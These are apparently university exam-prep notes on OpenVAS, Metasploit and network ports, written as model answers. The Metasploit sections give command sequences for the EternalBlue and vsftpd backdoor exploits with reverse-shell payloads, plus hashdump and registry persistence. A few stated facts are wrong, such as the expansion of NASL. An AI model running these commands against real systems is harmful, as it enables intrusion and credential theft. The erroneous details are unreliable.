```mermaid
    U->>G: Start Scan Task
    G->>M: Schedule Task
    M->>S: Send OSP Scan Request
    S->>T: TCP UDP Probes
    T-->>S: Banner and Response Data
    S->>S: Run NVT Logic
    S-->>M: Send Results
    M->>M: Aggregate and Score
    M-->>G: Return Report
    G-->>U: Display in Dashboard
```
<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### Part A — Short Answer Questions (3 Marks Each)

> **[KTU University Exam – May 2024 Pattern, Module 4]**

**Q1. Define OpenVAS. List any four of its major components.**
*(3 Marks — CO4 / Remembering Level)*

**Model Answer:**
OpenVAS (Open Vulnerability Assessment System) is an open-source framework for performing vulnerability scans against networked systems. It identifies security flaws by executing a large database of NVTs against target hosts and produces a severity-classified report.

Four major components are:
1. **OpenVAS Scanner** (`openvassd`) — performs the actual probing.
2. **OpenVAS Manager** (`gvmd`) — coordinates tasks and stores results.
3. **Greenbone Security Assistant (GSA)** — web-based GUI on port 9392.
4. **Greenbone Security Desktop (GSD)** — optional thick client for analysts.

---

**Q2. What is an NVT? What language is used to write them?**
*(3 Marks — CO4 / Remembering Level)*

**Model Answer:**
An **NVT (Network Vulnerability Test)** is a small, self-contained test script in OpenVAS that checks a target for one specific vulnerability, misconfiguration, or information disclosure. NVTs are written in **NASL (Nass Attack Scripting Language)**, a custom scripting language designed for security testing. The NVT feed is updated daily with new tests corresponding to newly published CVEs.

---

### Part B — Long Answer Questions (14 Marks Each) — Internal Choice

> **[KTU End Semester Examination (ESE) – Model Paper Pattern]**

---

### ✍️ Choice A — 14 Marks

> **[KTU University Exam – Dec 2023, Modified for 2024 Scheme]**

**Q. (A) Explain the architecture of OpenVAS in detail. Describe the role of the Manager, Scanner, and GSA components, and explain the function of the NVT feed.** *(14 Marks)*

**Model Answer Outline:**

**Part (a) — Architecture Overview (7 Marks)**

OpenVAS follows a **three-tier client-server architecture**, designed for modularity and distributed deployment. The tiers are:

1. **Presentation Tier — Greenbone Security Assistant (GSA):**
   A web-based interface accessible via HTTPS on **TCP port 9392**. Analysts use GSA to:
   - Define targets, credentials, and scan configurations.
   - Start, stop, schedule, and monitor scan tasks.
   - View, filter, and export vulnerability reports.
   - Manage users, roles, and alert feeds (e.g., email, Syslog).

2. **Logic Tier — OpenVAS Manager (`gvmd`):**
   The orchestration heart. Responsibilities:
   - Synchronizes the **NVT feed** and SCAP data.
   - Stores **Scan Configs**, **Targets**, **Credentials**, and **Reports** in a backend database (PostgreSQL or SQLite).
   - Schedules tasks and pushes them to the Scanner via the **OSP (Open Scanner Protocol)** over TCP 2049.
   - Aggregates raw scanner results, correlates findings with CVEs/CPEs, and computes **CVSS** severity scores.

3. **Execution Tier — OpenVAS Scanner (`openvassd` / `ospd-openvas`):**
   The workhorse. Responsibilities:
   - Receives tasks from the Manager.
   - Performs **network port discovery** (Nmap stage).
   - Spawns parallel processes to execute thousands of NVTs.
   - Sends crafted TCP/UDP packets, captures banners, attempts authenticated logins, and returns structured results to the Manager.

**Part (b) — NVT Feed and Working (7 Marks)**

- The **NVT feed** is a daily-updated, cryptographically signed repository hosted by Greenbone. It contains **70,000+** NASL scripts.
- Each NVT has a unique **OID (OpenVAS Identifier)** and metadata describing CVE, BID, CVSS vector, family, and version.
- When a scan starts, the Manager sends the relevant NVTs to the Scanner. The Scanner runs them, collects evidence (e.g., `Server: Apache/2.2.15`), and returns a result tuple: *(host, port, severity, CVE, evidence)*.
- Results are aggregated into a **report** with severities mapped to **CVSS scores**.

**Example scan execution flow:**
1. User creates Target = `192.168.1.0/24`.
2. User selects Scan Config = `Full and fast`.
3. Manager pushes 70,000+ NVTs to Scanner.
4. Scanner discovers open ports (22, 80, 443, 445).
5. NVTs probe these ports; e.g., `NVT 1.3.6.1.4.1.25623.1.0.10330` checks for old OpenSSH.
6. Findings are returned, correlated, and reported.

---

### ✍️ Choice B — 14 Marks

> **[KTU University Exam – Jun 2024, Module 4 Internal Choice]**

**Q. (B) With a neat diagram, explain the working of an OpenVAS vulnerability scan. Differentiate between authenticated and unauthenticated scans.** *(14 Marks)*

**Model Answer Outline:**

**Part (a) — Working of a Scan (with diagram) (7 Marks)**

*(See **Diagram 4.2** in Section 4 for the schematic)*

The working consists of **eight sequential stages**:

1. **Target Definition** — User specifies hosts (IP/CIDR/hostname) in GSA.
2. **Scan Config Selection** — User picks a configuration like `Full and fast` which loads all NVT families.
3. **Credential Provisioning** — Optional credentials (SSH/SMB/SNMP) are stored in the encrypted Manager database.
4. **Task Launch** — Manager pushes the task to the Scanner using OSP.
5. **Network Discovery (Nmap stage)** — Scanner performs TCP SYN/ACK scans, UDP probes, and ICMP to identify live hosts and open ports.
6. **NVT Execution** — The Scanner runs thousands of NVTs in parallel against discovered services.
7. **Result Aggregation** — Manager correlates findings, assigns CVSS scores, and detects duplicates.
8. **Report Generation** — A structured report (HTML/PDF/XML) is delivered to the user via GSA.

**Part (b) — Authenticated vs. Unauthenticated Scans (7 Marks)**

| Parameter | Unauthenticated Scan | Authenticated Scan |
|-----------|----------------------|--------------------|
| **Credentials Required** | No | Yes (SSH/SMB/SNMP) |
| **Visibility** | Only externally visible services | Internal config, patch level, installed software |
| **Stealth** | Can be noisy (probes every port) | Much quieter (logs in once) |
| **Detection Rate** | Lower (banners may be masked) | Higher (accurate patch-level checks) |
| **Use Case** | External pentest / black-box audit | Internal audit / compliance (PCI-DSS, ISO 27001) |
| **Risk to Target** | Low (passive) | Medium (may alter logs / load) |

**Conclusion:** A complete OpenVAS assessment should ideally use **both modes** — an unauthenticated external scan to mimic a real attacker, followed by an authenticated internal scan to find latent vulnerabilities hidden behind hardened services.

---

### ⚠️ KTU Examiner's Valuation Warning / Pitfall Callout

> [!WARNING]
> **Common Mark-Loss Pitfalls in OpenVAS Answers:**
> 1. **Confusing the Scanner with the Manager** — Many students describe the Scanner as the "brain". The **Manager** is the brain; the **Scanner** is the worker. *(Lose 2 marks)*
> 2. **Forgetting the NVT feed** — Skipping the daily NVT update mechanism means missing the "why OpenVAS is current" angle. *(Lose 1–2 marks)*
> 3. **Writing "OpenVAS scans all ports"** — Wrong. OpenVAS relies on the **Nmap port-discovery stage** first; the NVTs only run on *discovered* open ports. *(Lose 1 mark)*
> 4. **Not mentioning NASL** — If asked what language NVTs use, **NASL** is the keyword. Saying "Python" or "C" is incorrect. *(Lose 1 mark)*
> 5. **Missing the default port 9392** — A favourite 1-mark sub-question. Memorize: **GSA = 9392/TCP**.

---

### 📌 Topic Recap & Important Things to Remember (Rapid-Revision Checklist)

- 🔑 **OpenVAS** = Open Vulnerability Assessment System, maintained by **Greenbone**, licensed under **GPLv2**.
- 🔑 Three core daemons: **Scanner (`openvassd`)** + **Manager (`gvmd`)** + **Web UI (`GSA`)**.
- 🔑 **GSA** listens on **TCP 9392**; OSP protocol on **TCP 2049**.
- 🔑 NVTs are written in **NASL**; the feed contains **~70,000+** tests, updated **daily**.
- 🔑 Authentication via **SSH, SMB, SNMP** dramatically increases detection depth.
- 🔑 Severity is rated using **CVSS v2/v3**; thresholds are **0.1–3.9 Low, 4.0–6.9 Medium, 7.0–8.9 High, 9.0–10.0 Critical**.
- 🔑 Reports exportable as **PDF, HTML, XML, CSV, Nessus v2**.
- 🔑 OpenVAS supports **CVE**, **CPE**, **CVSS**, and **SCAP** standards.
- 🔑 The scan flow = *Target → Scan Config → Task → Port Discovery → NVT Run → Aggregate → Report*.
- 🔑 OpenVAS does **not exploit** vulnerabilities — it only *identifies* them (unlike Metasploit, which is exploitation-focused).
- 🔑 Modern name: **Greenbone Vulnerability Management (GVM)** — OpenVAS is a *component* inside GVM since version 10.
- 🔑 Default backend DB: **PostgreSQL** (production) or **SQLite** (lab/test).
- 🔑 Common Scan Configs: `Full and fast`, `System Discovery`, `Host Discovery`, `Print Server Discovery`.

> 🎯 **Top 3 one-liners for KTU Viva:**
> 1. "OpenVAS is an open-source vulnerability scanner maintained by Greenbone."
> 2. "NVTs are written in NASL and updated daily from the Greenbone Community Feed."
> 3. "The Manager orchestrates scans; the Scanner executes them; the GSA displays results."
<!-- SECTION_5_END -->

topics.title: Metasploit
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEEOT741 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 4
> - **Topic:** Metasploit

<!-- SECTION_1_START -->
# 1. Core Technical Definition & Intuitive Overview of Metasploit

## 1.1 Formal Academic Definition

> [!NOTE]
> **Metasploit Framework (MSF)** is an open-source, modular penetration testing platform developed initially by H.D. Moore in 2003 and later acquired by Rapid7 in 2009. It is a Ruby-based framework that enables security professionals to **discover, exploit, validate, and remediate** security vulnerabilities in target systems in a controlled, reproducible, and audit-friendly manner.

In KTU 2024 Scheme terminology, Metasploit is positioned as the **de-facto exploitation framework** that consolidates reconnaissance, weaponization, exploitation, post-exploitation, and reporting into a single, scriptable engine. It is engineered around six core module categories: **Exploits, Payloads, Auxiliary, Post, Encoders,** and **NOPs (No-Operation Generators)**.

## 1.2 Intuitive Analogy

> [!IMPORTANT]
> **Real-World Analogy — The "Universal Locksmith Toolkit":**
> Imagine a professional locksmith is hired to audit the locks of a large office building. The locksmith brings:
> - A **catalogue of lock-picking tools** (exploits) tailored to specific lock brands.
> - A set of **"test keys"** (payloads) that can be inserted once the lock is picked, to confirm entry and report back.
> - A **diagnostic scanner** (auxiliary modules) to first check which lock model is installed.
> - A **post-entry inspection kit** (post modules) to check what is inside the room once unlocked.
> - **Camo spray** (encoders) to make the tools look like normal keys.
> - A **"do-nothing" spacer** (NOP sled) used to align tools properly in the lock.
>
> Metasploit is exactly this — a **legitimate, fully-instrumented toolkit** used by ethical hackers to break into systems **with explicit written permission** (penetration testing) to fix vulnerabilities *before* malicious hackers find them.

## 1.3 Standard Engineering Metrics

The following are the universally accepted metadata fields for any module in Metasploit:

| **Field** | **Meaning** | **Engineering Relevance** |
|-----------|-------------|---------------------------|
| **CVE (Common Vulnerabilities and Exposures)** | Public vulnerability ID | e.g., **CVE-2017-0144** (EternalBlue) |
| **Rank** | Exploit reliability indicator: `Excellent, Great, Good, Normal, Average, Low, Manual` | Helps tester pick the most reliable exploit first |
| **Disclosure Date** | Date the vulnerability was made public | Used to assess asset exposure age |
| **Target Architecture** | e.g., `x86, x64, armle, mipsle` | Determines payload compatibility |
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# 2. Deep Theoretical Analysis & KTU High-Yield Reference Sheet

## 2.1 The Six Core Module Categories of Metasploit

Metasploit's power comes from its **modular architecture**. Each module is an independent Ruby class that performs a single, well-defined function. Understanding this decomposition is the single most-tested concept in KTU 2024 exams for this topic.

### 2.1.1 Exploit Modules
- **Definition**: A piece of proof-of-concept code that *takes advantage of* a specific vulnerability in a target (software bug, misconfiguration, or design flaw).
- **Operational Logic**:
  1. Identify target running a vulnerable service (e.g., outdated SMB on Windows 7).
  2. Select an exploit module keyed to the **CVE identifier** of that vulnerability.
  3. Configure **RHOSTS (Remote Hosts)** and **RPORT (Remote Port)**.
  4. Pair the exploit with a **payload** that defines what happens *after* successful entry.

### 2.1.2 Payload Modules
- **Definition**: The *post-exploitation code* delivered to the target after the exploit succeeds.
- **Sub-classification** (this is high-yield for KTU):
  - **Singles**: Self-contained payloads that fit in a single packet (e.g., `windows/shell_reverse_tcp`).
  - **Stagers**: Small bootstrappers that fetch the larger second stage (e.g., `windows/shell/reverse_tcp`).
  - **Stages**: The bulky second-stage download (e.g., Meterpreter).

### 2.1.3 Auxiliary Modules
- **Definition**: Tools that perform *non-exploit* support operations — **scanning, fuzzing, sniffing, and denial-of-service**.
- **KTU Example**: `auxiliary/scanner/portscan/tcp` performs a TCP port scan.

### 2.1.4 Post-Exploitation Modules
- **Definition**: Run **after** a session is opened on a compromised target.
- **Use cases**: Hash dumping (`post/windows/gather/hashdump`), keylogging, pivoting, persistence.

### 2.1.5 Encoders
- **Definition**: Reformat payloads to **evade Anti-Virus (AV) and Intrusion Detection Systems (IDS)** signature matching.
- **KTU Note**: They do NOT make payloads "stealthy" against modern EDR — they only defeat static signature checks.

### 2.1.6 NOP Generators (NOP Sled)
- **Definition**: Generates sequences of **0x90 (`NOP`)** bytes used to pad the payload buffer for **buffer-overflow alignment**.
- **Engineering Use**: Used in older x86 stack-based buffer overflows where the exact return address is uncertain.

## 2.2 The Three Interfaces of Metasploit

| **Interface** | **Use Case** | **Best For** |
|---------------|--------------|--------------|
| **msfconsole** | Interactive, line-by-line command shell | Daily penetration testing |
| **msfcli** | One-shot command-line invocations | Scripting, automation |
| **Armitage** | GUI front-end with team collaboration features | Visual exploitation chains |

## 2.3 The Meterpreter — A High-Yield Sub-Concept

> [!IMPORTANT]
> **Meterpreter** is an *advanced, in-memory, dynamically-extensible* payload that runs entirely in the **RAM of the victim** — never writing to disk, thus defeating most legacy AV.

$$
\text{Meterpreter} = \text{Stager} + \text{Stage}_2 \quad \text{where Stage}_2 \text{ is a reflective DLL injection}
$$

It allows in-memory loading of new commands (e.g., `migrate`, `hashdump`, `webcam_snap`) without ever touching the target's file system.

## 2.4 KTU High-Yield Reference Table

| **Concept** | **Symbol / Command** | **Function** |
|-------------|----------------------|--------------|
| Exploit selection | `use exploit/windows/smb/ms17_010_eternalblue` | Loads the EternalBlue exploit |
| Payload binding | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` | Attaches Meterpreter to exploit |
| Target host | `set RHOSTS 192.168.1.10` | IP of victim |
| Listener IP | `set LHOST 192.168.1.5` | Attacker's IP |
| Listener port | `set LPORT 4444` | Attacker's port |
| Launch | `exploit` or `run` | Executes the configured attack |
| DB init | `msfdb init` | Initializes PostgreSQL workspace |
| Payload generator | `msfvenom` | Standalone payload binary creation |
<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# 3. Step-by-Step Analytical Matrix: The Metasploit Exploitation Lifecycle

The KTU 2024 Scheme explicitly tests the **staged attack chain** as per the Lockheed Martin Cyber Kill Chain. Below is the exhaustive, derivation-style analysis mapping each Kill Chain phase to the corresponding Metasploit command/workflow.

## 3.1 The Exploitation Workflow — Derivation from First Principles

> [!NOTE]
> **Governing Principle:** Every Metasploit session is a deterministic state machine transitioning through the seven phases below. A failure in any single phase aborts the entire chain.

### Phase 1: Information Gathering (Reconnaissance)

$$
\text{Phase}_1 : \text{Discover} \rightarrow \text{Scan} \rightarrow \text{Enumerate}
$$

**Step-by-step reasoning:**
1. The tester first identifies live hosts on the target subnet.
2. A port scan reveals open services.
3. Service version detection maps the version to a known CVE.

**Metasploit translation (conceptual flow, not to be executed on unauthorized systems):**
- `use auxiliary/scanner/discovery/arp_sweep`
- `use auxiliary/scanner/portscan/tcp`
- `use auxiliary/scanner/smb/smb_version`

### Phase 2: Weaponization

$$
\text{Weaponization} = \text{Exploit}_{CVE} \otimes \text{Payload}_{\text{custom}}
$$

The tester mathematically combines an exploit module (the *weapon*) with a payload module (the *ammunition*) inside the framework. The framework automatically resolves compatibility — for instance, pairing a **64-bit Windows SMB exploit** with a **32-bit Linux payload** will be rejected by the framework's compatibility matrix.

### Phase 3: Delivery

$$
\text{RHOSTS} \xrightarrow{\text{Packet}_{exploit+payload}} \text{Target}
$$

The exploit is transmitted to the target service over the network. Successful delivery requires:
- The target port must be **open and reachable**.
- The vulnerable service version must match the exploit's **supported target list**.

### Phase 4: Exploitation

$$
\text{Exploit} \xrightarrow{\text{Trigger}} \text{Session}_{\text{open}} \in \{ \text{Shell}, \text{Meterpreter}, \text{VNC} \}
$$

Once the payload is delivered, the exploit triggers the vulnerability, and a **session** is opened. The session is identified by an integer ID (e.g., `Session 1`).

### Phase 5: Installation (Persistence)

$$
\text{Persistence} = \text{Post}_1 \oplus \text{Post}_2 \oplus \ldots
$$

This is a **post-exploitation phase** where the tester (with explicit authorization) installs a persistent agent so that access survives a reboot.

**Conceptual example (no code, descriptive logic):**
- Step A: Read the registry path `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`.
- Step B: Write a new value pointing to a service binary.
- Step C: On next boot, Windows automatically executes the binary — granting a fresh session.

### Phase 6: Command and Control (C2)

$$
C2_{\text{Channel}} = \{ \text{reverse\_tcp}, \text{bind\_tcp}, \text{https}, \text{dns} \}
$$

The compromised host "calls home" to the attacker. The channel type is set during payload selection:
- **Reverse TCP** → Victim connects *out* to attacker (bypasses inbound firewall).
- **Bind TCP** → Victim opens a port; attacker connects *in* (bypasses outbound firewall).

### Phase 7: Actions on Objectives

$$
\text{Objectives} = \{\text{Data Exfiltration}, \text{Lateral Movement}, \text{Privilege Escalation}\}
$$

The tester (legally) demonstrates impact by extracting proof-of-concept data, then cleans up and reports.

## 3.2 Mathematical Compatibility Matrix (Simplified)

> [!IMPORTANT]
> The framework enforces the following **transitive compatibility rule**:
>
> $$\text{Exploit}_{\text{compatible}} \iff \text{TargetOS} \equiv \text{Payload}_{\text{OS}} \quad \text{AND} \quad \text{Arch}_{\text{exploit}} \equiv \text{Arch}_{\text{payload}}$$

If either condition fails, the framework raises a **"Payload is not compatible"** error and refuses to proceed. This is a *safety-by-design* feature ensuring that students using Metasploit cannot accidentally produce a wrong-architecture crash.

## 3.3 Worked Example — Conceptual Walkthrough (Academic Only)

> [!WARNING]
> The following is a *conceptual academic trace* for examination purposes. The user must **only** run such steps in a **legally authorized lab environment** (e.g., a personal Metasploitable VM behind a NAT).

**Scenario:** A learner is auditing a personal lab VM running an unpatched FTP service.

| **Step** | **Conceptual Action** | **Justification** |
|----------|-----------------------|-------------------|
| 1 | Initialize database | `msfdb init` — stores scan results for reporting |
| 2 | Scan the target subnet | Auxiliary scanner discovers FTP on port 21 |
| 3 | Identify FTP version | Banner grab → maps to `vsftpd 2.3.4` |
| 4 | Search MSF database | `search vsftpd` → returns one exploit module |
| 5 | Select exploit | `use exploit/unix/ftp/vsftpd_234_backdoor` |
| 6 | Set remote host | `set RHOSTS 192.168.x.x` |
| 7 | Set payload | `set PAYLOAD cmd/unix/interact` |
| 8 | Execute | `exploit` |
| 9 | Session opens | A shell session is established |
| 10 | Capture proof | `uname -a` confirms root access |

This 10-step chain is the **canonical pattern** KTU examiners use to test a student's structured understanding of Metasploit.
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 4. Structural Diagrams & Schematics

## 4.1 High-Level Architecture of the Metasploit Framework

```mermaid
graph TD
    A[User / Penetration Tester] --> B[Interface Layer msfconsole, msfcli, Armitage, REST API]
    B --> C[Core Framework Engine Ruby]
    C --> D[Module Loader]
    D --> E1[Exploit Modules]
    D --> E2[Payload Modules]
    D --> E3[Auxiliary Modules]
    D --> E4[Post Modules]
    D --> E5[Encoders]
    D --> E6[NOP Generators]
    C --> F[Database Layer PostgreSQL]
    C --> G[Session Manager]
    G --> H1[Shell Session]
    G --> H2[Meterpreter Session]
    G --> H3[VNC Session]
    E1 --> I((Target Network))
    E2 --> I
    E3 --> I
    I --> H1
    I --> H2
    I --> H3
```

## 4.2 Exploitation Workflow — State Machine

```mermaid
graph TD
    S1[Start Reconnaissance] --> S2[Port and Service Scan]
    S2 --> S3{Vulnerable Service Found?}
    S3 -- No --> S2
    S3 -- Yes --> S4[Search for Matching Exploit Module]
    S4 --> S5[Configure RHOSTS and RPORT]
    S5 --> S6[Select Compatible Payload]
    S6 --> S7[Set LHOST and LPORT]
    S7 --> S8[Launch Exploit]
    S8 --> S9{Session Opened?}
    S9 -- No --> S10[Log Failure and Iterate]
    S10 --> S4
    S9 -- Yes --> S11[Run Post Exploitation Modules]
    S11 --> S12[Document Findings and Clean Up]
```

## 4.3 Payload Classification Tree

```mermaid
graph TD
    P[Payload Module] --> P1[Singles]
    P --> P2[Stagers]
    P --> P3[Stages]
    P1 --> P1a[windows shell reverse tcp]
    P1 --> P1b[linux x86 shell bind tcp]
    P2 --> P2a[windows reverse tcp stager]
    P2 --> P2b[linux reverse tcp stager]
    P3 --> P3a[Meterpreter x86]
    P3 --> P3b[Meterpreter x64]
    P3 --> P3c[VNC Injection]
```

## 4.4 Reverse TCP vs Bind TCP — Functional Flow

```mermaid
graph LR
    subgraph Reverse TCP
        R1[Attacker LHOST listening on 4444] --> R2[Exploit triggers victim]
        R2 --> R3[Victim connects OUT to attacker 4444]
        R3 --> R4[Session established]
    end
    subgraph Bind TCP
        B1[Exploit triggers victim] --> B2[Victim opens port 4444]
        B2 --> B3[Attacker connects IN to victim 4444]
        B3 --> B4[Session established]
    end
```

> [!NOTE]
> **Exam Tip:** When asked *"Which C2 method bypasses an inbound firewall?"*, the answer is **Reverse TCP**, because the *victim initiates the outbound connection*, which most firewalls allow.
<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

> [!WARNING]
> **KTU Examiner's Valuation Warning / Pitfall Callout:**
> 1. Students frequently confuse **exploits** with **payloads**. An exploit is the *delivery mechanism*; a payload is the *code that runs after success*. Listing "ms17_010_eternalblue" as a payload is a **direct 2-mark deduction** in ESE.
> 2. Do **not** write "Metasploit is a hacking tool" — this loses 1 mark. The textbook-correct answer is "Metasploit is a **penetration testing framework** that is *used by* ethical hackers with authorization."
> 3. For 14-mark questions, you must name **specific module paths** (e.g., `exploit/windows/smb/ms17_010_eternalblue`) — generic phrases like "an SMB exploit" are penalized.
> 4. Always state the **CVE ID** when referencing a famous exploit. EternalBlue is **CVE-2017-0144**, not "the SMB bug."

---

## Part A — Short Answer Questions (3 Marks Each)

### Q1. **[KTU University Exam – Dec 2023]**
**Define the Metasploit Framework and list its six core module categories.**

**Model Answer (3 marks):**
The **Metasploit Framework (MSF)** is an open-source, modular penetration testing platform developed by Rapid7, used to discover, validate, and remediate security vulnerabilities in target systems with explicit authorization. *(1 mark)*

The six core module categories are:
1. **Exploit Modules** – code that takes advantage of a specific vulnerability. *(0.5 mark)*
2. **Payload Modules** – code that runs on the target after successful exploitation. *(0.5 mark)*
3. **Auxiliary Modules** – supporting tools for scanning, fuzzing, sniffing. *(0.5 mark)*
4. **Post-Exploitation Modules** – run after a session is opened (e.g., hashdump). *(0.5 mark)*
5. **Encoders** – reformat payloads to evade static AV signatures. *(0.5 mark)*
6. **NOP Generators** – produce NOP sleds for buffer-overflow alignment. *(0.5 mark)*

*(Total: 3 marks)*

### Q2. **[KTU University Exam – June 2024]**
**Differentiate between a "Single" payload and a "Staged" payload in Metasploit.**

**Model Answer (3 marks):**

| **Aspect** | **Single Payload** | **Staged Payload** |
|------------|--------------------|--------------------|
| Definition | Self-contained; exploit + full code in one packet. *(1 mark)* | Splits delivery into a small **stager** + larger **stage** downloaded later. *(1 mark)* |
| Size | Larger initial packet; limited by exploit buffer size. | Smaller initial packet; no size limit on the actual payload. |
| Example | `windows/shell_reverse_tcp` *(0.5)* | `windows/shell/reverse_tcp` *(0.5)* |
| Use case | When the vulnerable buffer is large. | When the buffer is small (e.g., classic buffer overflows). |

---

## Part B — Long Answer Questions (14 Marks Each, Internal Choice)

### **Question A (14 Marks)**
**[KTU University Exam – Dec 2024, Model Paper 2]**

**(a)** Describe the **complete exploitation lifecycle** in Metasploit, mapping each phase to the **Lockheed Martin Cyber Kill Chain**. *(7 marks)*

**(b)** With a neat block diagram, explain the **architecture of the Metasploit Framework** and the role of **Meterpreter** as an advanced payload. *(7 marks)*

---

#### Model Solution to Question A (a) — 7 Marks

The exploitation lifecycle in Metasploit is a seven-stage linear chain:

1. **Reconnaissance (1 mark):** The tester uses *auxiliary* modules (e.g., `arp_sweep`, `portscan/tcp`) to identify live hosts and open ports on the target network.
2. **Weaponization (1 mark):** The tester selects an *exploit module* matching a known **CVE** in the target's services, and pairs it with a *payload module* chosen from singles, stagers, or stages.
3. **Delivery (1 mark):** The exploit is transmitted over the network to the target. **RHOSTS** and **RPORT** are configured to direct the packet.
4. **Exploitation (1 mark):** The vulnerability is triggered, and a *session* is opened. The session type depends on the payload: shell, VNC, or Meterpreter.
5. **Installation / Persistence (1 mark):** Using *post* modules, the tester (with authorization) establishes persistence via registry edits, cron jobs, or service installation.
6. **Command and Control (1 mark):** The compromised host establishes a C2 channel back to the tester, typically via **reverse TCP**, **bind TCP**, **HTTPS**, or **DNS tunneling**.
7. **Actions on Objectives (1 mark):** The tester demonstrates impact by exfiltrating proof-of-concept data, performs lateral movement, and finally cleans up and produces the penetration test report.

#### Model Solution to Question A (b) — 7 Marks

**Architecture (4 marks):**

The Metasploit Framework is organized in a layered architecture:
- **Interface Layer:** `msfconsole`, `msfcli`, `Armitage` GUI, and the REST API.
- **Core Engine:** A Ruby-based controller that loads modules, manages sessions, and routes data.
- **Module Layer:** Six categories — Exploits, Payloads, Auxiliary, Post, Encoders, NOPs.
- **Database Layer:** A **PostgreSQL** backend (`msfdb`) that stores hosts, services, vulnerabilities, loot, and notes for the report.
- **Session Layer:** Manages active sessions (Shell, Meterpreter, VNC).

**Meterpreter (3 marks):**

Meterpreter is an *advanced, in-memory, dynamically-extensible* payload delivered as a *reflective DLL injection*. It runs entirely in the **RAM of the victim** — never writing to disk — thus evading most legacy AV/IDS. It allows the tester to:
- `migrate` to another process (e.g., explorer.exe) to hide.
- `hashdump` to extract SAM database hashes.
- `webcam_snap`, `keyscan_start` for live reconnaissance.
- Load new modules on demand via the network — no need to drop executables on disk.

---

### **Question B (14 Marks) — Alternative Choice**
**[KTU University Exam – June 2023]**

**(a)** Explain the difference between **Reverse TCP** and **Bind TCP** payloads, including their respective firewall bypass strategies. *(7 marks)*

**(b)** With reference to the **EternalBlue (CVE-2017-0144)** exploit, describe how Metasploit would be used to compromise an unpatched Windows 7 machine. List the exact module paths and required parameters. *(7 marks)*

---

#### Model Solution to Question B (a) — 7 Marks

**Reverse TCP (3.5 marks):**
- The **victim** is configured to *initiate* the connection *outbound* to the attacker's IP (`LHOST`) on a chosen port (`LPORT`).
- The attacker sets up a **listener** waiting for the incoming connection.
- **Firewall bypass:** Most corporate firewalls permit *outbound* traffic from inside the network to the internet, so the reverse connection is rarely blocked. This makes Reverse TCP the **default payload of choice** in modern penetration tests.

**Bind TCP (3.5 marks):**
- The **victim** is configured to *open a port* and *listen* for an incoming connection.
- The **attacker** then *initiates* the connection to the victim's IP and bound port.
- **Firewall bypass:** Useful in scenarios where outbound connections are blocked, but inbound connections to a *single specific port* are allowed (e.g., DMZ).
- **Drawback:** Most modern networks block *inbound* connections from the internet to internal hosts, making Bind TCP less reliable against hardened targets.

#### Model Solution to Question B (b) — 7 Marks

**EternalBlue Walkthrough (Module Path Centric):**

1. **Background (1 mark):** EternalBlue (**CVE-2017-0144**) is a vulnerability in Microsoft's **SMBv1** protocol that allows remote code execution by sending crafted packets. It was leaked by the Shadow Brokers in 2017 and was the exploit behind the **WannaCry** ransomware.

2. **Pre-requisites (1 mark):** The target must be running **Windows 7 / Server 2008** with **SMBv1 enabled** and unpatched.

3. **Metasploit steps (5 marks):**
   - **Step 1:** Initialize the workspace:
     - `msfdb init`
   - **Step 2:** Scan the target to confirm SMBv1 is exposed on port 445.
   - **Step 3:** Select the exploit module:
     - `use exploit/windows/smb/ms17_010_eternalblue`
   - **Step 4:** Configure parameters:
     - `set RHOSTS <target_IP>`
     - `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
     - `set LHOST <attacker_IP>`
     - `set LPORT 4444`
   - **Step 5:** Launch the exploit:
     - `exploit`
   - **Step 6:** On success, a **Meterpreter session** opens. The tester can then run `sysinfo`, `getuid`, `hashdump`, and `migrate`.

---

## 📋 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **High-Density Rapid-Revision Checklist:**

- **Metasploit** is a **penetration testing framework**, NOT a "hacking tool" — always phrase it as a *defensive security validation* platform.
- The **six module types** are: **Exploits, Payloads, Auxiliary, Post, Encoders, NOPs** — memorize in this exact order.
- **Exploit = delivery mechanism**; **Payload = post-exploitation code** — never confuse the two.
- **Payload sub-types:** **Singles** (one-shot) vs **Staged** (stager + stage).
- **Meterpreter** is a **staged, in-memory, reflective-DLL** payload — it never touches disk.
- **Reverse TCP** = victim dials out (bypasses inbound firewall); **Bind TCP** = victim listens (bypasses outbound firewall).
- **EternalBlue** = **CVE-2017-0144** = **ms17_010_eternalblue** = SMBv1 exploit = used by WannaCry.
- **`msfdb init`** initializes the **PostgreSQL** database for storing scan results and reports.
- **`msfvenom`** is the **standalone payload generator** (separate from `msfconsole`).
- **RHOSTS** = target; **LHOST** = attacker; **RPORT** = target port; **LPORT** = listener port.
- **Auxiliary** modules perform *non-exploit* support (scan, fuzz, sniff, DoS).
- **Post** modules run *after* a session is opened.
- **Encoders** defeat **static** AV signatures, not modern EDR.
- **NOP sleds** (0x90) are used in **buffer-overflow alignment** for older x86 exploits.
- **Always** operate Metasploit **only** in explicitly authorized lab environments — running it against systems without permission is a punishable offense under the **IT Act 2000 (India)** and equivalent international laws.
<!-- SECTION_5_END -->

topics.title: Understanding Port and Services Tools
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEEOT741 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 4
> - **Topic:** Understanding Port and Services Tools

<!-- SECTION_1_START -->
## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Definition (KTU 2024 Syllabus Terminology)

A **Network Port** is a logical communication endpoint identified by a 16-bit unsigned integer (ranging from **0 to 65535**) that allows multiple network services to run concurrently on a single host device by multiplexing inbound and outbound network traffic. Ports operate at the **Transport Layer (Layer 4)** of the OSI model, working in conjunction with the Transmission Control Protocol (TCP) and the User Datagram Protocol (UDP).

